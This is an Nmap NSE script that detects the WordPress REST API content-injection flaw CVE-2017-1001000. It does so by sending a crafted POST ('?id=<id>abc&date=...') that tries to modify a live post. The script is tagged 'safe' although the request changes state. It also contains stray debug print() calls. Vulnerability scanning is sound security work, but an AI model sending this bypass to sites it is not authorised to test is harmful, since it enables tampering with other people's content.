local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local url = require "url"
local vulns = require "vulns"
local json = require "json"

description = [[ 
There is privilege escalation vulnerability in Wordpress
  Rest API. WordPress Versions 4.7.0 and 4.7.1 are known to be affected. The
  vulnerability allows the visitor to edit any post and replace it with whatever
  the attacker wants.
 
  ]]

---
-- @usage
-- nmap --script http-vuln-cve2017-1001000 --script-args http-vuln-cve2017-1001000="uri" <target>
-- nmap --script http-vuln-cve2017-1001000 <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2017-1001000:
-- |   VULNERABLE:
-- |   Content Injection in Wordpress REST API
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2017-1001000
-- |     Risk factor: Medium  CVSSv2: 5.0 (MEDIUM) 
-- |       The privilege escalation vulnerability in WordPress REST API allows
-- |       the visitors to edit any post on the site 
-- |       Versions 4.7.0 and 4.7.1 are known to be affected
-- |    
-- |     References:
-- |       http://securityaffairs.co/wordpress/55892/hacking/wordpress-zero-day-content-injection.html
-- |       https://nvd.nist.gov/vuln/detail/CVE-2017-1001000
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1001000
-- |_      https://www.exploit-db.com/exploits/41223
--
-- @args http-vuln-cve2017-1001000.uri Wordpress root directory on the website. Default: /
---

author = "Vinamra Bhatia"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.http

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
  uri = uri .. 'index.php/wp-json/wp/v2/posts/' --Uri is appended to get the JSON data

  local response = http.get(host, port, uri, nil)

  if response.status == 200 then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln_table = {
      title = 'Content Injection Vulnerability in Wordpress REST API',
      state = vulns.STATE.NOT_VULN, --default Non Vulnerable State
      IDS = {CVE = 'CVE-2017-1001000'},
      risk_factor = "Medium",
      scores = {
        CVSSv2 = "5.0 (MEDIUM)",
      },
      description = [[
The privilege escalation vulnerability in WordPress REST API allows
the visitors to edit any post on the site .
Versions 4.7.0 and 4.7.1 are known to be affected.
      ]],
      references = {
          'http://securityaffairs.co/wordpress/55892/hacking/wordpress-zero-day-content-injection.html',
          'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html',
          'https://www.exploit-db.com/exploits/41223'
      },
    }

    local status, json_data = json.parse(response.body)

    --Parsing the json_data to get the ID of the first post and the date.
    local id=json_data[1].id
    local content=json_data[1].date

    if(id==nil or content==nil) then
      return vulnReport:make_output(vuln_table)
    end

    --Modifying the uri and checking for response. 
    --Date modification request is being sent.
    uri = uri ..id..'/'..'?id=' .. id ..'abc'..'&date='..content

    local request_opts = {
    header = {
      },
    }

    request_opts["header"]["Content-type"] = 'application/json'
    local response1 = http.post(host, port, uri, request_opts)

    print(response1.body)
    print(response1.status)

    --If response is correct, means the site allowed the modification
    --of the post and it is vulnerable.
    if(response1.status==200) then
      vuln_table.state = vulns.STATE.VULN
    end
    return vulnReport:make_output(vuln_table)
  end
end
